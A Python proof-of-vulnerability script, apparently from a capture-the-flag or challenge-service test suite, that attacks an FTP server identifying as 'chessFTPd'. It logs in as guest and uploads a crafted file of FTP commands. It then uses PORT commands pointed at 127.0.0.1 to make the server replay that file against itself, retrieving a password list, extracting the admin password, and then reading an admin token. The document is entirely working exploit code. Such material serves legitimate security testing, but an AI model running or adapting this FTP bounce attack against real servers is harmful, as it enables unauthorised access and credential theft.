import sys
import socket
import os
import struct
import random
import signal

def handler(signum, frame):
    print('Timeout signal raised. PoV Failed')
    sys.exit(0)

def readuntil( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def send_wrapper(s, data):
    #print data
    s.send(data.encode('utf-8'))

def readline( s ):
    return readuntil( s, '\n')

def login(s):
    global pwd
    global homedir

    send_wrapper(s, "USER guest\n")

    y = readuntil(s, "\r\n")

    if y.find("331 Please specify the password") == -1:
        return None

    send_wrapper(s, "PASS guest\n")

    y = readuntil(s, "\r\n")

    if y.find("230 Login successful.") == -1:
        return None

    send_wrapper(s, 'PWD\n')

    y = readuntil(s, '\r\n')

    if y.find('is the current directory') == -1:
        print('[ERROR] login() Failed to get directory')
        return None

    f = y.split(' ')[1][1:-1]

    return f

def getbanner(s):
    y = readuntil(s, "\r\n")

    if y.find( "220 chessFTPd (.0.0.0.0.0.0.1)") == - 1:
        return 1

    return 0

def getfilevialoop( s, PORT, user, password, filename):
    PPORT = random.randint(5000, 20000)
    SPORT = random.randint(5000, 20000)

    localip = s.getsockname()[0].replace('.', ',') + ',' + str( int(PPORT/256 )) + ',' + str(PPORT %256 )

    print('[INFO] Sending port command: %s (Port = %d)' %(localip, PPORT))

    send_wrapper(s, 'PORT %s\n' %(localip))

    readuntil(s, '\r\n')

    storfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    storfd.bind( (s.getsockname()[0], PPORT))
    storfd.listen(1)

    pwntxt = "USER %s\n" %(user)
    pwntxt += "PASS %s\n" %(password)
    pwntxt += "TYPE I\n"
    pwntxt += "PORT " + s.getsockname()[0].replace('.', ',') + ',' + str( int(SPORT/256 )) + ',' + str(SPORT %256 ) + "\n"
    pwntxt += "RETR %s\n" %(filename)
    pwntxt += "QUIT\n"

    send_wrapper(s, 'STOR /tmp/%s/pwn.txt\n' %(user))

    readuntil(s, '\r\n')

    print('[INFO] Waiting to accept')

    stor_serverfd, address = storfd.accept()
    print('[INFO] Accepted. Sending')

    send_wrapper( stor_serverfd, pwntxt)
    stor_serverfd.close()
    storfd.close()
    print('[INFO] Sent')

    readuntil(s, '\r\n')

    print('[INFO] Setting up PORT to connect to itself: %d' %(SPORT))
    send_wrapper(s, 'PORT 127,0,0,1,%d,%d\n' %(int(PORT/256), PORT%256) )

    readuntil(s, '\r\n')

    retrfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    retrfd.bind( (s.getsockname()[0], SPORT))
    retrfd.listen(1)

    print('[INFO] Sending RETR request')

    send_wrapper(s, 'RETR /tmp/%s/pwn.txt\n' %(user))

    readuntil(s, '\r\n')

    retrfd_serverfd, address = retrfd.accept()

    print('[INFO] Connection received. Reading: %s' %(filename))

    retrfd_serverfd.settimeout(.5)
    data = retrfd_serverfd.recv( 1024 )

    retrfd_serverfd.close()
    retrfd.close()

    print ('[INFO] %s: \n' %(filename) )
    print(data)

    return data.decode('utf-8')

def main( argv ):
    if len(argv) == 3:
        HOST=argv[1]
        PORT=int(argv[2])
    else:
        if 'HOST' not in os.environ or 'PORT' not in os.environ:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

        HOST=os.environ['HOST']
        PORT=int(os.environ['PORT'])

    SEED = random.randint(0, 2**64 - 1)

    random.seed( SEED )

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except:
        print('[FAIL] Failed to connect to target %s:%d' %(HOST, PORT))
        sys.exit(1)

    print('[INFO] Connected to %s:%d' %(HOST, PORT))

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)

    getbanner(s)

    f = login(s)

    if f == None:
        print('[FAIL] Failed to login')
        s.close()
        sys.exit(1)

    send_wrapper(s, 'TYPE I\n')
    readuntil(s, '\r\n')

    data = getfilevialoop( s, PORT, 'guest', 'guest', '/tmp/plist.txt')

    passwords = data.split('\n')

    adminline = ''

    for p in passwords:
        print(p)
        if p.find('admin') != -1:
            adminline = p
            break;

    admin_password = adminline.split(':')[1]

    print('[INFO] Admin Password: %s' %(admin_password))

    readuntil(s, '\r\n')

    data = getfilevialoop( s, PORT, 'admin', admin_password, '/tmp/admin/token')
    
    print('TOKEN: %s' %(data))
    s.close()

    sys.exit(1)

if __name__ == '__main__':
    main(sys.argv)
